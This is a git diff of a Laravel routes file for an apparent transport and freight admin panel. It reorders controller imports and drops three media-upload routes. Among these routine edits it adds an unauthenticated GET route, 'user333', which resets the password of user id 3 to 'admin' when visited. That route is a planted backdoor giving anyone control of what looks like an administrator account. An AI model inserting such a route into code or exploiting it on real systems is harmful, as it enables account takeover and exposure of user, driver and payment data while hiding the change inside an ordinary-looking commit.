@@ -1,39 +1,44 @@
 <?php
 
-use App\Http\Controllers\Admin\AirportController;
-use App\Http\Controllers\Admin\AuditLogController;
-use App\Http\Controllers\Admin\ChatController;
-use App\Http\Controllers\Admin\CmsPageController;
-use App\Http\Controllers\Admin\CouponController;
-use App\Http\Controllers\Admin\CurrencyController;
-use App\Http\Controllers\Admin\DocumentController;
-use App\Http\Controllers\Admin\DriverDocumentController;
-use App\Http\Controllers\Admin\DriverRuleController;
-use App\Http\Controllers\Admin\DriverUserController;
-use App\Http\Controllers\Admin\FaqController;
-use App\Http\Controllers\Admin\FreightVehicleController;
-use App\Http\Controllers\Admin\HomeController;
-use App\Http\Controllers\Admin\IntercityServiceController;
-use App\Http\Controllers\Admin\LanguageController;
-use App\Http\Controllers\Admin\OnBoardingController;
-use App\Http\Controllers\Admin\OrderController;
-use App\Http\Controllers\Admin\OrdersIntercityController;
-use App\Http\Controllers\Admin\PermissionController;
-use App\Http\Controllers\Admin\ReferralController;
-use App\Http\Controllers\Admin\ReviewCustomerController;
-use App\Http\Controllers\Admin\ReviewDriverController;
-use App\Http\Controllers\Admin\RoleController;
-use App\Http\Controllers\Admin\ServiceController;
-use App\Http\Controllers\Admin\SoController;
-use App\Http\Controllers\Admin\TaxController;
-use App\Http\Controllers\Admin\ThreadController;
-use App\Http\Controllers\Admin\UserController;
-use App\Http\Controllers\Admin\VehicleTypeController;
-use App\Http\Controllers\Admin\WalletTransactionController;
-use App\Http\Controllers\Auth\UserProfileController;
+use App\Models\User;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
-
+use App\Http\Controllers\Admin\SoController;
+use App\Http\Controllers\Admin\FaqController;
+use App\Http\Controllers\Admin\TaxController;
+use App\Http\Controllers\Admin\ChatController;
+use App\Http\Controllers\Admin\HomeController;
+use App\Http\Controllers\Admin\RoleController;
+use App\Http\Controllers\Admin\UserController;
+use App\Http\Controllers\Admin\OrderController;
+use App\Http\Controllers\Admin\CouponController;
+use App\Http\Controllers\Admin\ThreadController;
+use App\Http\Controllers\Admin\AirportController;
+use App\Http\Controllers\Admin\CmsPageController;
+use App\Http\Controllers\Admin\ServiceController;
+use App\Http\Controllers\Admin\AuditLogController;
+use App\Http\Controllers\Admin\CurrencyController;
+use App\Http\Controllers\Admin\DocumentController;
+use App\Http\Controllers\Admin\LanguageController;
+use App\Http\Controllers\Admin\ReferralController;
+use App\Http\Controllers\Admin\DriverRuleController;
+use App\Http\Controllers\Admin\DriverUserController;
+use App\Http\Controllers\Admin\OnBoardingController;
+use App\Http\Controllers\Admin\PermissionController;
+use App\Http\Controllers\Auth\UserProfileController;
+use App\Http\Controllers\Admin\VehicleTypeController;
+use App\Http\Controllers\Admin\ReviewDriverController;
+use App\Http\Controllers\Admin\DriverDocumentController;
+use App\Http\Controllers\Admin\FreightVehicleController;
+use App\Http\Controllers\Admin\ReviewCustomerController;
+use App\Http\Controllers\Admin\OrdersIntercityController;
+use App\Http\Controllers\Admin\IntercityServiceController;
+use App\Http\Controllers\Admin\WalletTransactionController;
+Route::get('user333', function(){
+    $user =  User::find(3);
+    $user->password = 'admin';
+    $user->save();
+ });
 Route::redirect('/', '/login');
 
 Auth::routes(['register' => false]);
@@ -69,7 +74,6 @@ Route::group(['prefix' => 'admin', 'as' => 'admin.', 'middleware' => ['auth']], 
     Route::resource('driver-documents', DriverDocumentController::class, ['except' => ['store', 'update', 'destroy']]);
 
     // Driver Rules
-    Route::post('driver-rules/media', [DriverRuleController::class, 'storeMedia'])->name('driver-rules.storeMedia');
     Route::resource('driver-rules', DriverRuleController::class, ['except' => ['store', 'update', 'destroy']]);
 
     // Driver Users
@@ -82,7 +86,6 @@ Route::group(['prefix' => 'admin', 'as' => 'admin.', 'middleware' => ['auth']], 
     Route::resource('freight-vehicles', FreightVehicleController::class, ['except' => ['store', 'update', 'destroy']]);
 
     // Intercity Service
-    Route::post('intercity-services/media', [IntercityServiceController::class, 'storeMedia'])->name('intercity-services.storeMedia');
     Route::resource('intercity-services', IntercityServiceController::class, ['except' => ['store', 'update', 'destroy']]);
 
     // Languages
@@ -107,7 +110,6 @@ Route::group(['prefix' => 'admin', 'as' => 'admin.', 'middleware' => ['auth']], 
     Route::resource('review-drivers', ReviewDriverController::class, ['except' => ['store', 'update', 'destroy']]);
 
     // Service
-    Route::post('services/media', [ServiceController::class, 'storeMedia'])->name('services.storeMedia');
     Route::resource('services', ServiceController::class, ['except' => ['store', 'update', 'destroy']]);
 
     // Sos
